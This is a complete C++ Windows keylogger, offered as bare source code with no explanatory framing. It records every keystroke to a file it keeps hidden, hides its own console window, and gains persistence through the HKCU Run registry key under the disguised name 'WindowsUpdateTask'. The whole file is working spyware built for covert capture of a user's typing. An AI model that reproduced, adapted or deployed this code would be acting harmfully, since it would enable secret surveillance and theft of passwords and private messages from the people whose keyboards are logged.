#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
using namespace std;

void save(string add) {
	fstream logfile;
	logfile.open("data.txt", fstream::app);
	if (logfile.is_open()) {
		logfile << add;
		logfile.close();
		// This ensures the file is hidden every single time it's updated
		SetFileAttributesA("data.txt", FILE_ATTRIBUTE_HIDDEN);
	}
}



void RegisterPersistence() {

	char szPath[MAX_PATH];
	GetModuleFileNameA(NULL, szPath, MAX_PATH);


	HKEY hKey;
	const char* czContext = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";


	LONG lnRes = RegOpenKeyExA(HKEY_CURRENT_USER, czContext, 0, KEY_WRITE, &hKey);

	if (lnRes == ERROR_SUCCESS) {

		RegSetValueExA(hKey, "WindowsUpdateTask", 0, REG_SZ, (unsigned char*)szPath, strlen(szPath) + 1);



		RegCloseKey(hKey);
	}
}





bool whatkey(int WhtKey) {
	switch (WhtKey) {
	case VK_SPACE:
		save(" ");
		return true;
	case VK_RETURN:
		save("\n");
		return true;
	case VK_OEM_PERIOD:
		save(".");
		return true;
	case VK_SHIFT:
		save("#SHIFT#");
		return true;
	case VK_BACK:
		save("\b");
		return true;
	case VK_RBUTTON:
		save("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		save("#CAPS_LOCK");
		return true;
	case VK_TAB:
		save("#TAB");
		return true;
	case VK_UP:
		save("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		save("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		save("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		save("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		save("#CONTROL");
		return true;
	case VK_MENU:
		save("#ALT");
		return true;
	default:
		return false;
	}

}
int main() {
	RegisterPersistence();
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	while (true) {
		Sleep(5);
		for (int key = 8; key <= 190; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				if (whatkey(key) == false) {

					fstream logfile;
					logfile.open("data.txt", fstream::app);
					if (logfile.is_open()) {
						logfile << char(key);
						logfile.close();
				      SetFileAttributesA("data.txt", FILE_ATTRIBUTE_HIDDEN);
					}
				}
			}



		}
	}
	return 0;
}